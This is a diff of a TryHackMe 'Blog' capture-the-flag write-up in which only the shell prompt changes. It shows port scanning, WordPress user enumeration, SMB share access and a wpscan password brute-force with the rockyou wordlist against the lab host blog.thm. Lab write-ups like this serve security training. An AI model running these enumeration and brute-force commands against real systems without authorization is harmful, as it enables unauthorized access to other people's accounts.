@@ -7,7 +7,7 @@
 # enumerate
 ## nmap
 ```console
-kali@kali:~$ sudo python3 pymap.py -t 10.10.44.145
+bibo318@parrot:~$ sudo python3 pymap.py -t 10.10.44.145
 [sudo] password for kali: 
 created by gu2rks/kurohat 
 find me here https://github.com/gu2rks
@@ -75,7 +75,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
 ## users
 
 ```console
-kali@kali:~$ wpscan --url http://blog.thm --enumerate u
+bibo318@parrot:~$ wpscan --url http://blog.thm --enumerate u
 .
 .
 .
@@ -109,7 +109,7 @@ kali@kali:~$ wpscan --url http://blog.thm --enumerate u
 
 ## smb
 ```console
-kali@kali:~$ smbclient -L \\\\blog.thm
+bibo318@parrot:~$ smbclient -L \\\\blog.thm
 Enter WORKGROUP\kali's password: 
 
         Sharename       Type      Comment
@@ -118,7 +118,7 @@ Enter WORKGROUP\kali's password:
         BillySMB        Disk      Billy's local SMB Share
         IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
 SMB1 disabled -- no workgroup available
-kali@kali:~/THM/blog$ smbclient \\\\blog.thm\\BillySMB
+bibo318@parrot:~/THM/blog$ smbclient \\\\blog.thm\\BillySMB
 Enter WORKGROUP\kali's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -143,7 +143,7 @@ seem like smb shared file are a trap :P
 # Foothold
 let start with brute forcing to gain access to wordpress dashboard
 ```console
-kali@kali:~/THM/blog$ wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel,bjoel
+bibo318@parrot:~/THM/blog$ wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel,bjoel
 ```
 After some time, you will get the 1 credential with auther priv
 
